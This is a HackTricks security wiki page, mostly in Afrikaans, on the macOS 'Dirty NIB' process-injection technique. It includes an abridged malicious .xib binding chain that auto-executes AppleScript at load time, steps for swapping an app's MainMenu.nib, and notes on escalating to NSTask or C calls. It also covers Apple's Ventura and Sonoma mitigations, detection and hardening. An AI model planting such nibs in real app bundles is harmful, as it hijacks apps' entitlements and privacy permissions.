# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB verwys na die misbruik van Interface Builder-lêers (.xib/.nib) binne ’n getekende macOS-app-bundel om aanvaller-beheerde logika binne die teikenproses uit te voer en sodoende die proses se entitlements en TCC-permissies te erf. Hierdie tegniek is oorspronklik deur xpn (MDSec) gedokumenteer en later deur Sector7 veralgemeen en aansienlik uitgebrei. Sector7 het ook Apple se versagtende maatreëls in macOS 13 Ventura en macOS 14 Sonoma bespreek.<sup>[1][2]</sup> Vir agtergrond en diepgaande ontledings, sien die verwysings aan die einde.

> TL;DR
> • Voor macOS 13 Ventura: die vervanging van ’n bundel se MainMenu.nib (of ’n ander nib wat tydens opstart gelaai word) kon betroubaar process injection en dikwels privilege escalation bewerkstellig.
> • Sedert macOS 13 (Ventura), en verder verbeter in macOS 14 (Sonoma): first-launch deep verification, bundle protection, Launch Constraints en die nuwe TCC “App Management”-permission voorkom grootliks post-launch nib-tampering deur onverwante apps. Attacks kan steeds in nisgevalle moontlik wees (bv. tooling van dieselfde developer wat sy eie apps wysig, of terminals waaraan die gebruiker App Management/Full Disk Access toegestaan het).


## Wat is NIB/XIB files

Nib (kort vir NeXT Interface Builder)-lêers is geserialiseerde UI-objectgrafieke wat deur AppKit-apps gebruik word. Moderne Xcode stoor bewerkbare XML .xib-lêers wat tydens build time in .nib saamgestel word. ’n Tipiese app laai sy hoof-UI via `NSApplicationMain()` wat die `NSMainNibFile`-sleutel uit die app se Info.plist lees en die object graph tydens runtime instansieer.

Belangrike punte wat die attack moontlik maak:
- NIB loading instansieer arbitrêre Objective-C-klasse sonder dat hulle aan NSSecureCoding hoef te voldoen (Apple se nib loader val terug na `init`/`initWithFrame:` wanneer `initWithCoder:` nie beskikbaar is nie).
- Cocoa Bindings kan misbruik word om metodes aan te roep terwyl nibs geïnstansieer word, insluitend chained calls wat geen user interaction vereis nie.


## Dirty NIB injection process (attacker view)

Die klassieke pre-Ventura-vloei:
1) Create a malicious .xib
- Voeg ’n `NSAppleScript`-object (of ander “gadget”-klasse soos `NSTask`) by.
- Voeg ’n `NSTextField` by waarvan die title die payload bevat (bv. AppleScript of command arguments).
- Voeg een of meer `NSMenuItem`-objects by wat via bindings gekoppel is om metodes op die target object aan te roep.

2) Auto-trigger without user clicks
- Gebruik bindings om ’n menu item se target/selector te stel en roep dan die private `_corePerformAction`-metode aan sodat die action outomaties uitgevoer word wanneer die nib gelaai word. Dit verwyder die behoefte dat ’n gebruiker op ’n button klik.

Minimal example of an auto-trigger chain inside a .xib (abridged for clarity):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Dit bewerkstellig arbitrêre AppleScript-uitvoering in die teikenproses wanneer die nib gelaai word.<sup>[1]</sup> Gevorderde kettings kan:
- Arbitrêre AppKit-klasse instansieer (bv. `NSTask`) en metodes sonder argumente soos `-launch` oproep.
- Arbitrêre selectors met objekargumente oproep deur die binding-truuk hierbo te gebruik.
- AppleScriptObjC.framework laai om ’n brug na Objective-C te skep en selfs geselekteerde C APIs op te roep.
- Op ouer stelsels wat steeds Python.framework insluit, ’n brug na Python skep en daarna `ctypes` gebruik om arbitrêre C-funksies op te roep (Sector7 se navorsing).<sup>[2]</sup>

3) Vervang die app se nib
- Kopieer target.app na ’n skryfbare ligging, vervang byvoorbeeld `Contents/Resources/MainMenu.nib` met die kwaadwillige nib, en voer target.app uit. Voor Ventura het daaropvolgende uitvoerings, ná ’n eenmalige Gatekeeper-assessering, slegs oppervlakkige handtekeningkontroles uitgevoer; nie-uitvoerbare hulpbronne (soos .nib) is dus nie weer gevalideer nie.

Voorbeeld van ’n AppleScript-payload vir ’n sigbare toets:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Moderne macOS-beskermingsmaatreëls (Ventura/Monterey/Sonoma/Sequoia)

Apple het verskeie sistemiese mitigations bekendgestel wat die lewensvatbaarheid van Dirty NIB in moderne macOS drasties verminder:<sup>[2]</sup>
- Diep verifikasie met eerste bekendstelling en bundle-beskerming (macOS 13 Ventura)
- Met die eerste uitvoering van enige app (gekarantyniseer of nie) dek ’n diepgaande handtekeningkontrole alle bundle-resources. Daarna word die bundle beskerm: slegs apps van dieselfde developer (of apps wat uitdruklik deur die app toegelaat word) mag die inhoud daarvan wysig. Ander apps vereis die nuwe TCC-“App Management”-permission om na ’n ander app se bundle te skryf.
- Launch Constraints (macOS 13 Ventura)
- System/Apple-bundled apps kan nie elders gekopieer en geloods word nie; dit beëindig die “copy to /tmp, patch, run”-benadering vir OS-apps.
- Verbeterings in macOS 14 Sonoma
- Apple het App Management verder gehard en bekende bypasses reggestel (byvoorbeeld CVE‑2023‑40450), soos deur Sector7 aangeteken. Python.framework is vroeër verwyder (macOS 12.3), wat sommige privilege-escalation chains verbreek het.
- Gatekeeper/Quarantine-veranderinge
- Vir ’n breër bespreking van Gatekeeper, provenance en assessment-veranderinge wat hierdie tegniek beïnvloed het, sien die bladsy waarna hieronder verwys word.

> Praktiese implikasie
> • Op Ventura+ kan jy gewoonlik nie ’n third-party app se .nib wysig nie, tensy jou process App Management het of deur dieselfde Team ID as die target gesign is (byvoorbeeld developer tooling).
> • Om App Management of Full Disk Access aan shells/terminals toe te ken, heropen hierdie attack surface effektief vir enigiets wat code binne daardie terminal se context kan uitvoer.


### Aanspreek van Launch Constraints

Launch Constraints blokkeer die uitvoering van baie Apple-apps vanaf nie-standaard-liggings vanaf Ventura. As jy op pre-Ventura-workflows staatgemaak het, soos om ’n Apple-app na ’n tydelike directory te kopieer, `MainMenu.nib` te wysig en dit te launch, verwag dat dit op >= 13.0 sal misluk.


## Teikens en nibs enumerating (nuttig vir navorsing / legacy systems)

- Vind apps waarvan die UI deur nibs gedryf word:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Vind kandidaat-nib-resources binne ’n bundle:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Valideer code signatures deeglik (sal misluk indien jy met resources gepeuter het en dit nie weer onderteken het nie):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Let wel: Op moderne macOS sal jy ook deur bundle-beskerming/TCC geblokkeer word wanneer jy sonder behoorlike magtiging na ’n ander app se bundle probeer skryf.


## Detection en DFIR-wenke

- File integrity monitoring op bundle-resources
- Hou dop vir mtime/ctime-veranderinge aan `Contents/Resources/*.nib` en ander nie-uitvoerbare resources in geïnstalleerde apps.
- Unified logs en prosesgedrag
- Monitor vir onverwagte AppleScript-uitvoering binne GUI-apps en vir prosesse wat AppleScriptObjC of Python.framework laai. Voorbeeld:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Proaktiewe assesserings
- Voer gereeld `codesign --verify --deep` oor kritieke apps uit om te verseker dat resources ongeskonde bly.
- Privilege-konteks
- Oudit wie/wat TCC-“App Management” of Full Disk Access het (veral terminals en management agents). Deur dit van algemene-purpose shells te verwyder, voorkom jy dat Dirty NIB-styl-tampering maklik heraktiveer word.


## Defensive hardening (developers en defenders)

- Verkies programmatic UI of beperk wat vanaf nibs geïnstantieer word. Vermy die insluiting van kragtige classes (bv. `NSTask`) in nib graphs en vermy bindings wat selectors indirek op arbitrêre objects aanroep.
- Gebruik die hardened runtime met Library Validation (reeds standaard vir moderne apps). Hoewel dit nie nib injection op sigself voorkom nie, blokkeer dit maklike native code loading en dwing dit attackers na scripting-only payloads.
- Moenie breë App Management-permissions in algemene-purpose tools aanvra of daarvan afhanklik wees nie. Indien MDM App Management vereis, skei daardie konteks van user-driven shells.
- Verifieer gereeld jou app bundle se integrity en maak jou update-mechanisms self-heal bundle-resources.


## Verwante leesstof in HackTricks

Leer meer oor Gatekeeper, quarantine en provenance changes wat hierdie technique beïnvloed:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## References

- [1] [xpn – DirtyNIB (original write-up with Pages example)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (April 5, 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
